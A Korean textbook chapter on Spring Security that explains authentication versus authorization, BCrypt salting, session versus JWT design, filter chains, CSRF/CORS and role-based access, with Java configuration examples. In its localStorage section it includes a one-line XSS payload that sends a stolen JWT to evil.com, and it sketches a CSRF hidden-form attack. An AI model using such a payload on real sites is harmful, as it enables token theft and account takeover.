# Chapter 5: 보안 - Spring Security

> "기능이 완성된 웹 애플리케이션은 **문이 없는 집**과 같다. 벽도 세우고 지붕도 올렸는데, 아무나 들어와 냉장고를 열고 금고를 뒤질 수 있다. 보안은 나중에 '추가하는 기능'이 아니라, 집을 설계할 때부터 '어디에 문을 달고 누구에게 열쇠를 줄 것인가'를 정하는 일이다."

## 들어가며: 왜 보안을 따로 배워야 하는가

CRUD API를 만들 줄 알게 되면 곧바로 이런 상황을 마주친다.

- `GET /api/users/1`을 요청하면 남의 개인정보가 그대로 튀어나온다.
- `DELETE /api/posts/99`를 아무나 호출해서 남의 글을 지운다.
- DB가 유출됐는데 비밀번호가 평문(`password123`)으로 저장돼 있었다.
- 로그인 없이 관리자 페이지에 접근된다.

이 문제들은 "기능 버그"가 아니다. **설계의 부재**다. 그리고 이 부재를 메우는 일이 하나같이 반복적이고, 실수하면 치명적이기 때문에, Spring은 이를 프레임워크 수준에서 표준화했다. 그것이 **Spring Security**다.

이 장의 목표는 단순히 "Spring Security 설정 코드를 외우는 것"이 아니다. **왜 이런 장치들이 존재하게 되었는가** — 즉 인증과 인가는 왜 나뉘어 있는지, 비밀번호는 왜 암호화가 아니라 해싱해야 하는지, 세션에서 토큰으로 왜 옮겨갔는지, 필터 체인은 왜 그런 순서인지를 **이유부터** 이해하는 것이다. 이유를 알면 설정 코드는 자연히 따라온다.

> 실습 모듈: 이 장에서 설명하는 JWT 발급/검증, Security 설정, RBAC를 실제로 동작시켜 보는 코드는 `chapter07-spring-security` 모듈에 있다. 개념을 읽고 나서 그 모듈의 `SecurityConfig`, `JwtService`, `JwtAuthenticationFilter`, `AuthController`를 열어 대조하면 이해가 단단해진다.

## 5.1 웹 보안의 두 기둥: 인증(Authentication)과 인가(Authorization)

### 개념: "너 누구야?" vs "너 이거 할 수 있어?"

보안 초보가 가장 먼저 헷갈리는 것이 이 둘이다. 이름도 비슷하고(둘 다 Auth로 시작), 코드에서도 붙어 다닌다. 하지만 이 둘은 **완전히 다른 질문**에 답한다.

- **인증(Authentication)**: "**너 누구야?**" — 당신이 주장하는 그 사람이 맞는지 확인하는 과정. 아이디/비밀번호, 토큰, 지문 등으로 신원을 증명한다.
- **인가(Authorization)**: "**너 이거 할 수 있어?**" — 이미 신원이 확인된 사용자가 특정 자원이나 행위에 대한 **권한**을 가졌는지 판단하는 과정.

순서가 중요하다. **인증이 먼저, 인가가 나중**이다. 누구인지 모르는 사람에게 "이걸 할 권한이 있느냐"고 물을 수 없기 때문이다.

### 원리: 공항 비유

이 두 개념은 **공항 출국 절차**로 완벽하게 설명된다.

```
[공항 출국 절차]

  ┌──────────────────────┐
  │  1. 여권 심사대       │   ← 인증(Authentication)
  │  "너 누구야?"          │      여권을 보여준다 → 본인 확인
  │  여권 = 신원 증명      │      (아이디/비밀번호, 토큰)
  └──────────┬───────────┘
             │  신원 확인 완료
             ▼
  ┌──────────────────────┐
  │  2. 탑승 게이트        │   ← 인가(Authorization)
  │  "너 이거 할 수 있어?" │      탑승권의 좌석/등급 확인
  │  탑승권 = 권한 증명    │      (일반석 손님은 라운지 못 감)
  └──────────────────────┘

여권이 있어도(=인증 성공) 다른 비행기 탑승권으로는(=인가 실패)
그 게이트를 통과할 수 없다.
```

- **여권 = 인증**: 당신이 "홍길동"임을 증명한다. 하지만 여권만으로는 어느 비행기를 탈지 결정되지 않는다.
- **탑승권 = 인가**: "홍길동은 KE001편 15A석"이라는 권한. 여권이 진짜여도 탑승권이 없거나 다른 편이면 못 탄다.

HTTP 상태 코드도 이 구분을 그대로 반영한다.

- 인증 실패 → **401 Unauthorized** ("너 누구인지 증명 못 했어")
- 인가 실패 → **403 Forbidden** ("누군지는 알겠는데, 넌 이거 하면 안 돼")

> 함정: 이름은 401이 "Unauthorized(인가 안 됨)"지만, 실제 의미는 "**인증 안 됨(Unauthenticated)**"이다. 역사적 명명 실수다. 실무에서는 "401=로그인 필요, 403=권한 부족"으로 외우면 된다.

### 코드로 보기

Spring Security에서 이 구분은 설정에 그대로 드러난다.

```java
http
    // 인가 규칙: "누가 무엇을 할 수 있는가"
    .authorizeHttpRequests(auth -> auth
        .requestMatchers("/api/auth/**").permitAll()      // 인증 없이 허용
        .requestMatchers("/api/admin/**").hasRole("ADMIN") // ADMIN 권한 필요 (인가)
        .anyRequest().authenticated()                       // 나머지는 인증 필요
    );
```

`authenticated()`는 인증을 요구하고, `hasRole("ADMIN")`은 인가를 요구한다. 이 한 줄에 두 기둥이 모두 담겨 있다.

## 5.2 왜 비밀번호를 암호화(정확히는 해싱)하는가

### 문제제기: 평문 저장이라는 재앙

가장 단순한 회원 테이블을 상상해 보자.

```
users 테이블
┌────┬──────────┬──────────────┐
│ id │ username │ password     │
├────┼──────────┼──────────────┤
│ 1  │ alice    │ mypassword1  │  ← 평문(plaintext)
│ 2  │ bob      │ qwerty123    │
└────┴──────────┴──────────────┘
```

이렇게 저장하면 편하다. 로그인 시 입력값과 문자열만 비교하면 되니까. 하지만 이 편함의 대가는 **재앙적**이다.

1. **DB가 유출되면 끝**: SQL Injection 하나, 백업 파일 하나 유출로 모든 사용자의 비밀번호가 그대로 털린다.
2. **내부자 위험**: DBA, 개발자가 평문 비밀번호를 그냥 본다.
3. **비밀번호 재사용 연쇄 피해**: 사람들은 여러 사이트에 같은 비밀번호를 쓴다. 당신의 서비스가 털리면 그 사용자의 은행 계정까지 위험해진다.

그래서 규칙은 절대적이다: **비밀번호는 절대 평문으로 저장하지 않는다. 심지어 개발자도 원본을 알 수 없어야 한다.**

### 원리: 해시 함수의 세 가지 성질

비밀번호를 안전하게 저장하는 도구는 **암호화**가 아니라 **해시(hash) 함수**다. (둘의 결정적 차이는 5.6에서 깊게 다룬다.) 좋은 해시 함수는 세 가지 성질을 가진다.

1. **단방향(one-way)**: 입력 → 출력은 쉽지만, 출력 → 입력은 사실상 불가능하다. "계란을 스크램블할 수는 있어도 다시 원래 계란으로 되돌릴 수 없다."
2. **결정적(deterministic)**: 같은 입력은 항상 같은 출력을 낸다. (그래야 로그인 시 비교가 가능하다.)
3. **눈사태 효과(avalanche effect)**: 입력이 1비트만 바뀌어도 출력이 완전히 달라진다.

```
[눈사태 효과 (avalanche effect)]

  입력 "password"   → 5f4dcc3b5aa765d61d8327deb882cf99
  입력 "Password"   → dc647eb65e6711e155375218212b3964
                       └── 첫 글자 하나 바꿨을 뿐인데
                           출력이 완전히 다르다
  입력 "password1"  → 7c6a180b36896a0a8c02787eeafb0e4c

  한 글자 차이 = 결과의 절반 이상 비트가 뒤집힘
  → 출력만 보고 "얼마나 비슷한 입력인지" 유추 불가능
```

눈사태 효과가 중요한 이유: 만약 비슷한 입력이 비슷한 출력을 낸다면, 공격자가 출력을 조금씩 관찰하며 원본을 역추적할 수 있다. 눈사태 효과는 그 힌트를 없앤다.

### 왜 MD5/SHA가 아니라 BCrypt인가 — "느린 게 안전하다"

MD5, SHA-256도 단방향 해시 함수다. 그런데 왜 비밀번호에는 쓰면 안 될까? 답은 역설적이다. **너무 빠르기 때문**이다.

MD5, SHA는 "많은 데이터를 빠르게 지문 찍기" 용도로 설계됐다. 현대 GPU는 초당 수십억~수백억 개의 SHA-256 해시를 계산한다. 즉 공격자가 유출된 해시값을 보고 "가능한 모든 비밀번호를 다 넣어보는(brute force)" 데 걸리는 시간이 짧다는 뜻이다.

**BCrypt**(그리고 scrypt, Argon2)는 반대로 설계됐다. **의도적으로 느리게, 그리고 얼마나 느리게 할지 조절 가능하게** 만들었다.

```
[해시 속도 비교 (개념적)]

  SHA-256   : ▓ (0.00001초)   ← 너무 빠름 = 무차별 대입에 취약
  BCrypt    : ▓▓▓▓▓▓▓▓▓▓ (0.1초) ← 의도적으로 느림 = 방어력

  로그인 1회: 0.1초 → 사용자는 못 느낌
  공격자 10억번: 0.1초 × 10억 = 약 3년 → 방어 성공
```

- **정상 사용자**: 로그인 한 번에 0.1초는 전혀 체감되지 않는다.
- **공격자**: 수십억 번을 시도해야 하니, 0.1초 × 수십억 = 수년~수백년이 걸린다.

게다가 BCrypt는 **work factor(cost)** 파라미터가 있어서, 하드웨어가 빨라지면 이 값을 올려서 계속 "충분히 느리게" 유지할 수 있다. 미래 대비까지 설계에 담긴 것이다.

### 레인보우 테이블과 솔트(Salt)

단방향 해시라도 한 가지 약점이 있다. **결정적**이라는 성질 때문에, `md5("password") = 5f4dcc...`는 전 세계 어디서나 동일하다. 그래서 공격자는 "흔한 비밀번호 → 해시값" 대응표를 미리 만들어 둘 수 있다. 이것이 **레인보우 테이블(rainbow table)**이다.

```
[레인보우 테이블 공격]

  공격자가 미리 만들어 둔 표(수억 개)
  ┌──────────────┬──────────────────────────┐
  │ 원본          │ 해시값                    │
  ├──────────────┼──────────────────────────┤
  │ password     │ 5f4dcc3b5aa765d6...       │
  │ 123456       │ e10adc3949ba59ab...       │
  │ qwerty       │ d8578edf8458ce06...       │
  └──────────────┴──────────────────────────┘

  유출된 DB의 해시값 5f4dcc3b... 을 표에서 "찾기"만 하면
  → 원본이 "password"임을 즉시 알아냄 (역계산 없이 조회만으로!)
```

해결책이 **솔트(Salt)**다. 비밀번호에 사용자마다 다른 **무작위 문자열(솔트)**을 붙여서 해싱한다.

```
[솔트를 붙이면]

  alice: hash("password" + "x9$Kp2")  → aB3...   (솔트 x9$Kp2)
  bob  : hash("password" + "Qz7@mL")  → 9fD...   (솔트 Qz7@mL)

  → 같은 비밀번호 "password"라도 저장된 해시가 다르다
  → 미리 만든 레인보우 테이블이 무용지물
    (솔트마다 표를 새로 만들어야 하는데 사실상 불가능)
```

**BCrypt의 결정적 장점**: 솔트를 개발자가 따로 관리할 필요가 없다. BCrypt는 **솔트를 스스로 생성**해서 해시 결과 문자열 안에 함께 저장한다.

```
$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
└┬┘└┬┘└──────┬─────────┘└──────────────┬──────────────────┘
알고 cost   솔트(22자)              실제 해시값
```

이 한 문자열 안에 알고리즘 버전, cost, 솔트, 해시가 모두 들어 있다. 그래서 검증 시 이 문자열만 있으면 솔트를 다시 뽑아내 비교할 수 있다.

### 코드: BCryptPasswordEncoder

Spring Security는 `PasswordEncoder` 인터페이스로 이를 추상화한다.

```java
@Configuration
public class PasswordConfig {

    @Bean
    public PasswordEncoder passwordEncoder() {
        // 기본 strength(cost) = 10
        return new BCryptPasswordEncoder();
    }
}
```

사용은 두 메서드가 전부다.

```java
@Service
public class AuthService {

    private final PasswordEncoder passwordEncoder;

    // 회원가입: 평문 → 해시로 변환해 저장
    public void signUp(String username, String rawPassword) {
        String hashed = passwordEncoder.encode(rawPassword);
        // hashed = "$2a$10$N9qo8uLO..." 형태로 DB에 저장
        userRepository.save(new User(username, hashed));
    }

    // 로그인: 입력 평문과 저장된 해시를 비교
    public boolean login(String username, String rawPassword) {
        User user = userRepository.findByUsername(username)
            .orElseThrow(() -> new UsernameNotFoundException(username));

        // matches: 내부적으로 저장된 해시에서 솔트를 뽑아 재해싱 후 비교
        return passwordEncoder.matches(rawPassword, user.getPassword());
    }
}
```

핵심은 `matches(원문, 저장된해시)`다. 우리는 **복호화하지 않는다.** 대신 "입력 원문을 같은 방식으로 다시 해싱해서 저장값과 같은지" 비교할 뿐이다. 이것이 단방향 해시로도 로그인이 가능한 이유다.

> `encode()`를 같은 비밀번호로 두 번 호출하면 결과가 다르다(솔트가 매번 다르므로). 하지만 `matches()`는 둘 다 true를 반환한다. 이 점이 처음에는 낯설지만, 솔트가 결과 안에 들어 있기 때문에 성립한다.

## 5.3 세션 vs 토큰(JWT): 서버는 무엇을 기억해야 하는가

### 문제의 뿌리: HTTP는 상태가 없다(stateless)

HTTP는 **각 요청을 독립적으로** 처리한다. 서버는 "방금 로그인한 그 사람"과 "지금 글을 쓰는 이 사람"이 같은 사람인지 기본적으로 알 수 없다. 요청마다 기억이 리셋된다. 이것이 **stateless**의 의미다.

그렇다면 "로그인 상태"를 어떻게 유지할까? 두 가지 큰 접근법이 있다. **세션 방식**과 **토큰 방식**이다.

### 세션 방식: 서버가 상태를 기억한다

로그인에 성공하면 서버가 **세션(session)**을 만들어 서버 메모리(또는 DB)에 저장하고, 그 세션을 가리키는 **세션 ID**를 쿠키로 클라이언트에게 준다.

```
[놀이공원 손목밴드 비유]

  1. 입장(로그인): 매표소에서 손목밴드를 채워줌
     → 서버는 "밴드 #A73 = 홍길동, 자유이용권" 을 장부에 기록
  2. 놀이기구(요청): 밴드만 보여주면 통과
     → 직원(서버)이 장부에서 #A73을 찾아 신원 확인
  3. 밴드 번호(세션 ID)만 손님이 들고 다니고,
     실제 정보는 매표소 장부(서버)에 있다
```

```
[세션 저장소 구조]

  클라이언트                       서버
  ┌──────────────┐               ┌────────────────────────────┐
  │ Cookie:      │   요청 시      │  세션 저장소 (메모리/DB)     │
  │ SESSION=A73  │ ────────────▶ │  ┌──────┬─────────────────┐│
  └──────────────┘   세션ID 전달  │  │ A73  │ user=홍길동      ││
                                  │  │      │ role=USER        ││
                     응답: 신원   │  │ B92  │ user=김철수      ││
                     확인 완료     │  └──────┴─────────────────┘│
                                  └────────────────────────────┘
      쿠키에는 "번호표"만, 진짜 정보는 서버가 보관
```

**세션 방식의 약점** — 왜 확장이 어려운가:

```
[서버가 여러 대일 때의 문제]

  로그인은 서버1에서 함 → 세션 A73은 서버1 메모리에만 존재
         │
         ▼ (다음 요청이 로드밸런서에 의해 서버2로 감)
  서버2: "A73? 그런 세션 몰라" → 로그인 풀림!

  ┌──────────┐   ┌──────────┐   ┌──────────┐
  │  서버 1   │   │  서버 2   │   │  서버 3   │
  │ [A73]    │   │  (없음)   │   │  (없음)   │
  └──────────┘   └──────────┘   └──────────┘
```

- **메모리 부담**: 접속자가 많을수록 서버가 기억할 세션이 늘어난다.
- **확장 어려움(scale-out)**: 서버를 여러 대로 늘리면 세션이 서버마다 흩어져 위 문제가 생긴다. (해결하려면 세션 저장소를 Redis 등으로 분리해야 하는데, 추가 인프라가 필요하다.)
- **재시작 시 소멸**: 서버를 재시작하면 메모리의 세션이 전부 날아가 모두 로그아웃된다.

### 토큰 방식(JWT): 정보를 토큰에 담아 보낸다

**JWT(JSON Web Token)**의 발상은 반대다. "서버가 기억하지 말고, **필요한 정보를 토큰 자체에 넣어** 클라이언트가 들고 다니게 하자."

```
[여권 비유]

  세션 = 놀이공원 손목밴드(번호만 있고 정보는 장부에)
  JWT  = 여권(그 안에 이름, 국적, 사진, 유효기간이 다 들어있음)

  → 출입국 심사관(서버)은 여권 자체만 검사하면 됨.
    본국(발급 서버)에 전화해서 "이 사람 맞나요?" 물어볼 필요 없음.
```

즉 서버는 **아무것도 저장하지 않는다.** 토큰이 진짜인지(위조되지 않았는지)만 검증하면 된다.

### JWT의 구조: Header.Payload.Signature

JWT는 점(`.`)으로 구분된 세 부분으로 이루어진 문자열이다.

```
[JWT 구조]

  eyJhbGciOiJIUzI1NiJ9 . eyJzdWIiOiIxIiwicm9sZSI6IlVTRVIifQ . dBjftJeZ4CVP...
  └─────────┬─────────┘  └────────────────┬───────────────┘  └──────┬──────┘
      Header (헤더)              Payload (내용)                Signature (서명)

  각 부분은 Base64Url 로 인코딩되어 있다 (암호화가 아니라 인코딩!)
```

**1) Header** — 토큰의 메타데이터. 어떤 알고리즘으로 서명했는지.

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**2) Payload** — 실제 담고 싶은 정보. 이 정보 조각들을 **클레임(claim)**이라 부른다.

```json
{
  "sub": "1",              // subject: 사용자 ID
  "role": "USER",          // 커스텀 클레임: 권한
  "iat": 1719800000,       // issued at: 발급 시각
  "exp": 1719803600        // expiration: 만료 시각
}
```

**3) Signature** — 위 두 부분이 위조되지 않았음을 보증하는 **서명**. 서버만 아는 비밀키(secret)로 계산한다.

```
Signature = HMAC-SHA256(
    Base64Url(Header) + "." + Base64Url(Payload),
    secret키
)
```

### JWT 동작 원리: 서명 생성과 검증

```
[발급 시 - 서명 생성]

  1. 서버가 Header + Payload 준비
  2. secret 키로 HMAC-SHA256 계산 → Signature 생성
  3. Header.Payload.Signature 를 이어붙여 클라이언트에 전달

[검증 시 - 서명 대조]

  1. 클라이언트가 토큰을 보냄 (Authorization: Bearer eyJ...)
  2. 서버는 받은 Header.Payload 를 secret 키로 다시 HMAC 계산
  3. 방금 계산한 값 == 토큰에 붙어온 Signature ?
       같으면  → 위조 안 됨, 신뢰 (그리고 exp로 만료 확인)
       다르면  → 위조됨, 거부
```

핵심 통찰: **secret 키는 서버만 안다.** 공격자가 Payload를 마음대로 바꿔도(`"role":"USER"`를 `"role":"ADMIN"`으로), 올바른 Signature를 다시 만들 수 없다. secret이 없기 때문이다. 그래서 서명 검증에 실패하고 거부된다.

### 중요 경고: Payload는 암호화되지 않는다

가장 흔한 치명적 오해다. **JWT의 Payload는 암호화가 아니라 Base64Url 인코딩일 뿐이다.**

```
[누구나 Payload를 읽을 수 있다]

  eyJzdWIiOiIxIiwicm9sZSI6IlVTRVIifQ
       │  Base64 디코딩 (열쇠 필요 없음!)
       ▼
  { "sub": "1", "role": "USER" }
```

Base64는 암호가 아니라 그저 "바이너리를 문자열로 표현하는 방식"이다. 브라우저 콘솔에서 `atob()` 한 줄이면 누구나 내용을 읽는다.

- 서명(Signature)이 지키는 것은 **무결성**(위조 방지)이지 **기밀성**(내용 숨김)이 아니다.
- 따라서 **비밀번호, 주민번호, 카드번호 같은 민감정보를 Payload에 넣으면 안 된다.**

### 왜 JWT가 유행하게 되었나

세션의 "서버가 기억해야 한다"는 부담이 현대 아키텍처와 충돌하면서 JWT가 부상했다.

1. **서버 확장성(scale-out)**: 어느 서버로 요청이 가도 secret만 있으면 토큰을 검증할 수 있다. 세션 공유 인프라가 필요 없다.

```
[JWT는 서버 확장에 강하다]

  ┌──────────┐   ┌──────────┐   ┌──────────┐
  │  서버 1   │   │  서버 2   │   │  서버 3   │
  │ (secret) │   │ (secret) │   │ (secret) │  ← 모두 같은 secret만 있으면
  └────┬─────┘   └────┬─────┘   └────┬─────┘     어디서든 검증 가능
       └──────────────┴──────────────┘
        어느 서버로 가도 토큰 스스로 검증 → 세션 저장소 불필요
```

2. **MSA(마이크로서비스)**: 서비스가 잘게 쪼개져도 각 서비스가 토큰을 독립적으로 검증한다.
3. **모바일/다양한 클라이언트**: 쿠키에 의존하지 않으므로 앱, 서드파티에서 다루기 편하다.

### JWT의 단점 — 공짜는 없다

JWT가 만능은 아니다. "서버가 상태를 안 가진다"는 장점이 그대로 단점이 된다.

- **무효화(revocation)가 어렵다**: 발급한 토큰은 만료 전까지 유효하다. 로그아웃하거나 계정을 정지시켜도, 이미 나간 토큰은 서버가 "기억"하지 않으므로 막기 힘들다. (해결책: 짧은 만료 + Refresh Token, 또는 블랙리스트를 두는데 그러면 다시 상태를 갖게 되는 역설.)
- **토큰 크기**: 클레임이 많으면 커진다. 매 요청 헤더에 실려 나가므로 세션 ID보다 무겁다.
- **민감정보를 못 담는다**: 위에서 봤듯 Payload는 공개다.

### localStorage에 저장할 때의 XSS 주의

프론트엔드에서 JWT를 어디에 보관하느냐도 보안 이슈다.

```
[localStorage vs 쿠키]

  localStorage 저장:
    - JavaScript로 자유롭게 접근 가능
    - 문제: XSS 공격에 취약. 악성 스크립트가 주입되면
      document.location = "evil.com?t=" + localStorage.getItem("token")
      한 줄로 토큰이 탈취된다.

  HttpOnly 쿠키 저장:
    - JavaScript에서 읽을 수 없음(HttpOnly) → XSS로부터 상대적으로 안전
    - 대신 CSRF 대책이 필요
```

정답은 상황에 따라 다르지만, **localStorage에 토큰을 넣는다면 XSS 방어(입력값 이스케이프, CSP 등)가 필수**라는 점을 반드시 기억해야 한다.

## 5.4 Security Filter Chain: 요청은 여러 관문을 통과한다

### 개념: 보안은 필터의 연쇄로 이루어진다

Spring Security의 핵심 동작 원리는 **필터 체인(Filter Chain)**이다. 모든 HTTP 요청은 컨트롤러에 도달하기 **전에** 여러 개의 보안 필터를 순서대로 통과한다. 각 필터는 한 가지 책임만 맡는다.

```
[공항 보안 검색대 비유]

  탑승객(요청)이 게이트(컨트롤러)에 가려면 여러 검색대를 거친다.

  요청 → [1.여권/출처 확인] → [2.위험물 검사] → [3.신원 확인] → [4.권한 확인] → 게이트
```

```
[Security Filter Chain]

  HTTP 요청
     │
     ▼
  ┌─────────────────┐
  │ CorsFilter      │  출처(Origin)가 허용된 곳인가? (5.4 후반)
  └────────┬────────┘
           ▼
  ┌─────────────────┐
  │ CsrfFilter      │  위조 요청 방지 토큰 확인 (필요 시)
  └────────┬────────┘
           ▼
  ┌─────────────────────────────┐
  │ AuthenticationFilter (JWT)  │  "너 누구야?" 토큰 검증 → 인증
  │ (우리가 만든 커스텀 필터)     │  SecurityContext에 인증정보 저장
  └────────┬────────────────────┘
           ▼
  ┌─────────────────────────────┐
  │ AuthorizationFilter         │  "너 이거 할 수 있어?" 권한 확인 → 인가
  └────────┬────────────────────┘
           ▼
     Controller (@RestController)  ← 모든 관문 통과 후 도달
```

이 구조의 아름다움: **각 관심사가 분리**되어 있다. CORS는 CorsFilter만, 인증은 AuthenticationFilter만 책임진다. 그래서 우리는 필요한 필터만 켜고, 원하는 자리에 커스텀 필터(예: JWT 검증)를 끼워 넣을 수 있다.

### 코드: SecurityFilterChain 설정

Spring Boot에서 이 체인은 `SecurityFilterChain` 빈으로 구성한다. `chapter07-spring-security`의 `SecurityConfig`가 실제 예다. 아래는 그 전형적인 형태다.

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    private final JwtAuthenticationFilter jwtAuthenticationFilter;

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // (1) CSRF 비활성화 - JWT/STATELESS 환경이므로
            .csrf(csrf -> csrf.disable())

            // (2) CORS 설정 적용
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))

            // (3) 세션을 사용하지 않음 - 상태를 저장하지 않는다
            .sessionManagement(session ->
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))

            // (4) 인가 규칙
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/auth/**").permitAll()       // 로그인/회원가입은 공개
                .requestMatchers("/api/admin/**").hasRole("ADMIN")  // 관리자 전용
                .anyRequest().authenticated()                        // 나머지는 인증 필요
            )

            // (5) 우리의 JWT 필터를 기본 인증 필터 "앞에" 끼워 넣는다
            .addFilterBefore(jwtAuthenticationFilter,
                             UsernamePasswordAuthenticationFilter.class);

        return http.build();
    }
}
```

### 왜 CSRF를 비활성화하는가

`csrf.disable()`을 보면 초보자는 "보안을 끄는 거 아냐?"라고 놀란다. 맥락을 이해해야 한다.

**CSRF(Cross-Site Request Forgery)**는 "사용자가 로그인된 상태를 악용해, 다른 사이트가 사용자 몰래 요청을 보내는" 공격이다. 핵심은 **브라우저가 쿠키를 자동으로 첨부**한다는 점을 악용한다는 것이다.

```
[CSRF 공격의 원리]

  1. 사용자가 mybank.com에 로그인 (세션 쿠키 보유)
  2. 사용자가 evil.com 방문
  3. evil.com에 숨겨진 폼: <form action="mybank.com/transfer" ...>
  4. 자동 제출되면 → 브라우저가 mybank.com 쿠키를 "자동으로" 첨부
  5. 서버: "쿠키가 유효하네" → 사용자 몰래 송금 실행

  핵심: 공격이 성립하는 이유는 "쿠키가 자동 전송"되기 때문
```

그런데 우리가 **JWT를 헤더(`Authorization: Bearer ...`)로 보내고, 세션을 STATELESS로 두면** 상황이 바뀐다.

- 인증 정보(JWT)가 쿠키가 아니라 헤더에 있다.
- 헤더는 브라우저가 자동으로 첨부하지 않는다. JavaScript가 명시적으로 넣어야 한다.
- 따라서 CSRF의 전제("쿠키 자동 전송")가 성립하지 않는다.

결론: **JWT를 헤더로 쓰는 STATELESS API에서는 CSRF 공격 벡터가 없으므로 CSRF 필터를 끈다.** 반대로 **쿠키 기반 세션 인증을 쓴다면 CSRF는 반드시 켜야 한다.** "무조건 꺼도 된다"가 아니라 **맥락에 따른 판단**이다.

### 왜 CORS가 필요한가 — Same-Origin Policy

브라우저에는 **동일 출처 정책(Same-Origin Policy, SOP)**이라는 기본 보안 장치가 있다. "웹 페이지의 스크립트는 자신과 **같은 출처(origin)**의 자원에만 접근할 수 있다"는 규칙이다. 출처는 **프로토콜 + 도메인 + 포트**의 조합이다.

```
[동일 출처 판정]

  기준: https://app.example.com:443

  https://app.example.com/data     → 같은 출처 (OK)
  http://app.example.com           → 다름 (프로토콜 http≠https)
  https://api.example.com          → 다름 (도메인 app≠api)
  https://app.example.com:8080     → 다름 (포트 443≠8080)
```

SOP는 악성 사이트가 당신이 로그인한 은행 API를 몰래 호출하는 것을 막는 방패다. 하지만 현대 웹은 **프론트엔드(`app.example.com`)와 백엔드 API(`api.example.com`)가 다른 출처인 것이 일반적**이다. 이러면 정상적인 프론트엔드조차 API를 못 부른다.

그래서 서버가 명시적으로 "이 출처의 요청은 허용한다"고 선언하는 장치가 **CORS(Cross-Origin Resource Sharing)**다. 서버가 응답 헤더(`Access-Control-Allow-Origin` 등)로 예외를 허가하는 것이다.

### 코드: CORS 설정

```java
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();

    // 허용할 프론트엔드 출처 (와일드카드 * 는 인증 요청 시 지양)
    config.setAllowedOrigins(List.of("https://app.example.com"));

    // 허용할 HTTP 메서드
    config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "OPTIONS"));

    // 허용할 요청 헤더 (Authorization 포함해야 JWT 전송 가능)
    config.setAllowedHeaders(List.of("Authorization", "Content-Type"));

    // 쿠키/인증정보 포함 요청 허용 여부
    config.setAllowCredentials(true);

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", config);
    return source;
}
```

> 함정: `setAllowCredentials(true)`와 `setAllowedOrigins("*")`는 함께 쓸 수 없다(브라우저가 거부). 인증을 포함하는 요청은 출처를 명시해야 한다.

## 5.5 RBAC: 역할 기반 접근 제어

### 왜 "역할"이 필요한가

인가를 사용자 개개인 단위로 관리하면 지옥이 된다. "alice는 글쓰기 가능, bob은 삭제 가능, carol은..." 사용자가 늘수록 규칙이 폭발한다.

**RBAC(Role-Based Access Control)**의 발상: 권한을 **역할(Role)**로 묶고, 사용자에게는 역할만 부여한다. "관리자 역할은 삭제 가능"이라고 한 번 정의하면, 모든 관리자에게 자동 적용된다. 회사에서 "부장 직급은 결재 가능"이라고 정하는 것과 같다.

```
[권한 표: ROLE_USER vs ROLE_ADMIN]

  ┌──────────────────────┬────────────┬─────────────┐
  │ 자원 / 행위           │ ROLE_USER  │ ROLE_ADMIN  │
  ├──────────────────────┼────────────┼─────────────┤
  │ 게시글 조회           │    O       │     O       │
  │ 게시글 작성           │    O       │     O       │
  │ 본인 글 수정/삭제     │    O       │     O       │
  │ 남의 글 삭제          │    X       │     O       │
  │ 사용자 목록 조회       │    X       │     O       │
  │ 사용자 강제 탈퇴       │    X       │     O       │
  │ 시스템 설정 변경       │    X       │     O       │
  └──────────────────────┴────────────┴─────────────┘
```

### URL 기반 접근 제어

가장 큰 그물망 단위의 인가다. URL 패턴별로 필요한 역할을 지정한다.

```java
http.authorizeHttpRequests(auth -> auth
    .requestMatchers("/api/auth/**").permitAll()        // 누구나
    .requestMatchers(HttpMethod.GET, "/api/posts/**").permitAll()  // 조회는 공개
    .requestMatchers("/api/posts/**").hasRole("USER")   // 그 외 글 관련은 USER 이상
    .requestMatchers("/api/admin/**").hasRole("ADMIN")  // 관리자 영역
    .anyRequest().authenticated()
);
```

규칙은 **위에서 아래로 순서대로** 평가되고, 처음 매칭되는 규칙이 적용된다. 그래서 **구체적인 규칙을 위에, 포괄적인 규칙(`anyRequest`)을 맨 아래에** 둔다.

### 메서드 기반 접근 제어: @PreAuthorize

URL 단위로는 표현하기 어려운 세밀한 규칙(예: "본인 것만 수정")은 메서드 단위 어노테이션으로 처리한다. `@EnableMethodSecurity`를 켜야 한다.

```java
@EnableMethodSecurity  // 메서드 보안 활성화 (설정 클래스에)
public class SecurityConfig { ... }
```

```java
@Service
public class PostService {

    // ADMIN만 실행 가능
    @PreAuthorize("hasRole('ADMIN')")
    public void deleteAnyPost(Long postId) { ... }

    // 로그인한 본인이거나 ADMIN인 경우만
    @PreAuthorize("#username == authentication.name or hasRole('ADMIN')")
    public void updateProfile(String username, ProfileDto dto) { ... }
}
```

`@PreAuthorize`는 메서드 **실행 전에** SpEL(Spring Expression Language) 표현식을 평가해, 통과하지 못하면 예외를 던진다.

### ROLE_ 접두어 규칙: hasRole vs hasAuthority

여기서 초보자가 반드시 걸려 넘어지는 지점이 있다. Spring Security 내부적으로 권한은 모두 **GrantedAuthority**라는 문자열로 다뤄진다. 그리고 **역할(Role)은 관례적으로 `ROLE_` 접두어가 붙은 권한**이다.

```
[hasRole vs hasAuthority]

  DB/토큰에 저장된 실제 권한 문자열: "ROLE_ADMIN"

  hasRole("ADMIN")        → 내부에서 "ROLE_" 를 자동으로 붙여
                            "ROLE_ADMIN" 과 비교  ✅ 매칭
  hasRole("ROLE_ADMIN")   → "ROLE_ROLE_ADMIN" 이 되어버림  ❌ 실수!

  hasAuthority("ROLE_ADMIN") → 접두어를 붙이지 않고 그대로 비교  ✅ 매칭
  hasAuthority("ADMIN")      → "ADMIN" 그대로 비교  ❌ 매칭 안 됨
```

정리:

- `hasRole("X")` → 내부적으로 `ROLE_X`와 비교한다. **`ROLE_`를 빼고 이름만** 넣는다.
- `hasAuthority("Y")` → **접두어 없이 문자열 그대로** 비교한다. 그래서 역할을 검사하려면 `hasAuthority("ROLE_ADMIN")`처럼 접두어를 직접 넣어야 한다.

